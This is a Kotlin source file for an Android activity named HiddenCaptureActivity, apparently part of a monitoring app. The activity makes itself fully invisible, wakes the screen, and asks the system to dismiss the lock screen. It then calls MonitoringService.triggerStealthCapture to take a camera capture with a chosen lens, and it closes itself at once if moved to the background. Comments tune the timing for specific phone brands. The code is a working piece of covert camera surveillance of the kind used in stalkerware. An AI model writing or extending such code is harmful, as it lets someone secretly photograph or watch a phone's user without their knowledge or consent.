package com.example.android_security

import android.app.Activity
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.WindowManager

class HiddenCaptureActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Ensure absolutely no visual output
        window.attributes.alpha = 0f
        
        // Wake lock / screen focus piercer (critical for Oppo/Realme)
        val flags = WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                    
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O_MR1) {
            setShowWhenLocked(true)
            setTurnScreenOn(true)
            val keyguardManager = getSystemService(android.app.KeyguardManager::class.java)
            keyguardManager?.requestDismissKeyguard(this, null)
        } else {
            @Suppress("DEPRECATION")
            window.addFlags(
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
            )
        }
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE)

        val lens = intent.getIntExtra("lens", 0)
        
        MonitoringService.instance?.let { service ->
            // Delay precisely enough to let the strict ActivityManager grant window focus
            Handler(Looper.getMainLooper()).postDelayed({
                service.triggerStealthCapture(lens)
                
                // Keep activity alive just long enough for HAL stream initialization
                Handler(Looper.getMainLooper()).postDelayed({
                    finish()
                }, 4000)
            }, 600)
        } ?: finish()
    }
    
    override fun onPause() {
        super.onPause()
        finish() // Self-destruct aggressively if pushed to background
    }
}
